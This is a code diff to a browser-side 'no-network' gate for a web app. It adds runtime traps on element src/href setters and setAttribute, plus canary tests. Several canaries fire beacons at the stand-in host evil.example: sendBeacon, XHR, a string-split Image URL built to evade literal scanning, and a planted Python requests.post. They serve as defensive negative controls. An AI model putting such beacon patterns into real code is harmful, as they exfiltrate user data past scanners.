@@ -56,8 +56,9 @@ JS), each of which is fetched and scanned too. Egress is classified by target <i
 <code>WebSocket</code>, <code>EventSource</code>, <code>sendBeacon</code>) is a HARD FAIL; a same-origin /
 relative / <code>data:</code> / <code>blob:</code> load of a bundled asset is allowed and <i>listed</i>; a
 remote <code>&lt;a href&gt;</code> is a user <i>navigation</i>, not egress, and is listed separately.
-<b>Layer 2 (runtime)</b> boots each surface in a trapped iframe whose egress primitives throw on a
-cross-origin target and asserts none fired. <b>Layer 3 (Python — static lens)</b> reads the
+<b>Layer 2 (runtime)</b> boots each surface in a trapped iframe whose egress primitives — and the
+<code>src</code>/<code>href</code> setters and <code>setAttribute</code> of every loading element, so a constructed-URL
+<code>Image</code> beacon counts — throw on a cross-origin target, and asserts none fired. <b>Layer 3 (Python — static lens)</b> reads the
 <code>capture-host/</code> sources: a browser gate <i>cannot execute Python</i>, so this is a text lens
 (outbound HTTP client → FAIL; BLE / local file / LAN file-server → allowed) with a CI follow-up noted.
 <b>Negative control</b> plants egress in every lens and asserts the gate catches it (anti-vacuous-pass).
@@ -97,7 +98,7 @@ test-only line per lens — <code>fetch</code>, <code>import()</code>, <code>Web
 <code>EventSource</code>, <code>sendBeacon</code>, JS <code>.src=</code>, <code>&lt;script src&gt;</code>, <code>@import</code>,
 CSS <code>url()</code> — each scanned alone, and each <b>must</b> be flagged by its own lens (one row per lens, never a sum), plus a benign
 local string it must <b>not</b> (and a remote <code>&lt;a href&gt;</code> it must classify as nav, not egress).
-<b>Runtime:</b> a module that attempts one remote <code>fetch</code>/<code>WebSocket</code>/<code>sendBeacon</code>/<code>XMLHttpRequest</code>/<code>EventSource</code>
+<b>Runtime:</b> a module that attempts one remote <code>fetch</code>/<code>WebSocket</code>/<code>sendBeacon</code>/<code>XMLHttpRequest</code>/<code>EventSource</code>/constructed-URL <code>Image</code>/<code>setAttribute(src)</code>
 against the trap (must throw) + one local fetch (must be allowed). <b>Python:</b> a planted
 <code>requests.post("https://evil.example")</code> the Python lens must flag. Any miss HARD-FAILS the whole gate.</p>
 <p id="canarySummary" class="sub" style="margin:0 0 8px"></p>
@@ -266,6 +267,30 @@ const TRAP_SRC = `(function(){
   try{ if(navigator.sendBeacon){ var _b=navigator.sendBeacon.bind(navigator); navigator.sendBeacon=function(u,d){
     if(isRemote(u)){ rec('sendbeacon',u,true); throw new Error('[no-network] blocked sendBeacon → '+u); }
     rec('sendbeacon',u,false); return _b(u,d); }; } }catch(_){}
+  /* A SUBRESOURCE LOAD IS EGRESS TOO. Row 2026-11-08-the-runtime-trap-cannot-see-a-constructed-url-beacon:
+     the wrappers above cover the transport primitives only, and the static lens reads literal URLs
+     only, so new Image().src = 'https://' + host + '/p.gif' left the browser with nothing recorded.
+     These wrap the URL-bearing property setters of every loading element, and setAttribute for the
+     same attributes. An anchor (A / AREA) is navigation, not a load, so it stays outside. */
+  function trapProp(C, prop, kind){ try{ if(!C) return; var P=C.prototype, d=Object.getOwnPropertyDescriptor(P, prop);
+    if(!d || !d.set) return;
+    Object.defineProperty(P, prop, { configurable:true, enumerable:d.enumerable, get:d.get, set:function(v){
+      if(isRemote(v)){ rec(kind,v,true); throw new Error('[no-network] blocked remote '+kind+' → '+v); }
+      return d.set.call(this, v); } }); }catch(_){} }
+  trapProp(window.HTMLImageElement,  'src',  'img.src');
+  trapProp(window.HTMLScriptElement, 'src',  'script.src');
+  trapProp(window.HTMLIFrameElement, 'src',  'iframe.src');
+  trapProp(window.HTMLMediaElement,  'src',  'media.src');
+  trapProp(window.HTMLSourceElement, 'src',  'source.src');
+  trapProp(window.HTMLEmbedElement,  'src',  'embed.src');
+  trapProp(window.HTMLObjectElement, 'data', 'object.data');
+  trapProp(window.HTMLLinkElement,   'href', 'link.href');
+  trapProp(window.HTMLVideoElement,  'poster', 'video.poster');
+  try{ var _sa=Element.prototype.setAttribute; Element.prototype.setAttribute=function(n,v){
+    var k=String(n).toLowerCase(), t=String(this.tagName||'').toUpperCase();
+    if((k==='src'||k==='href'||k==='data'||k==='poster') && t!=='A' && t!=='AREA' && isRemote(v)){
+      rec('setAttribute '+k,v,true); throw new Error('[no-network] blocked remote setAttribute('+k+') → '+v); }
+    return _sa.apply(this, arguments); }; }catch(_){}
 })();`;
 
 function injectTrap(bundleText){
@@ -497,6 +522,10 @@ function localScriptSrcs(html){
       attempt('remote-beacon',function(){ return navigator.sendBeacon('https://evil.example/b','d'); });
       attempt('remote-xhr',   function(){ var x = new XMLHttpRequest(); x.open('GET','https://evil.example/x'); return null; });
       attempt('remote-es',    function(){ return new window.EventSource('https://evil.example/stream'); });
+      attempt('remote-img',   function(){ var h='evil'+'.example'; var i=new Image(); i.src='https://'+h+'/p.gif?d='+Date.now(); return null; });
+      attempt('remote-setattr', function(){ var h='evil'+'.example'; document.createElement('img').setAttribute('src','https://'+h+'/q.gif'); return null; });
+      attempt('local-img',    function(){ var i=new Image(); i.src='data:image/gif;base64,R0lGODlhAQABAAAAACw='; return null; });
+      attempt('remote-anchor', function(){ var a=document.createElement('a'); a.href='https://doi.org/10.1000/x'; a.setAttribute('href','https://doi.org/10.1000/y'); return null; });
       attempt('local-fetch',  function(){ return window.fetch('no-network-canary-local-probe.json'); });
     })();
   <\/script></body></html>`;
@@ -508,6 +537,10 @@ function localScriptSrcs(html){
   canRow('runtime · remote sendBeacon blocked', 'trap throws on https://evil.example', blockedSet.has('remote-beacon'));
   canRow('runtime · remote XHR blocked', 'trap throws on XMLHttpRequest.open(https://evil.example)', blockedSet.has('remote-xhr'));
   canRow('runtime · remote EventSource blocked', 'trap throws on https://evil.example', blockedSet.has('remote-es'));
+  canRow('runtime · constructed-URL Image beacon blocked', "trap throws on new Image().src = 'https://' + host", blockedSet.has('remote-img'));
+  canRow('runtime · remote setAttribute(src) blocked', 'trap throws on img.setAttribute(src, remote)', blockedSet.has('remote-setattr'));
+  canRow('runtime · data: image allowed', 'a data: src is local, NOT thrown', allowedSet.has('local-img'), 'trap must discriminate, not block-all');
+  canRow('runtime · remote <a href> allowed', 'an anchor is navigation, not a load', allowedSet.has('remote-anchor'));
   canRow('runtime · local fetch allowed', 'same-origin fetch NOT thrown', allowedSet.has('local-fetch'), 'trap must discriminate, not block-all');
 
   // (3) PYTHON canary — planted outbound client MUST be flagged
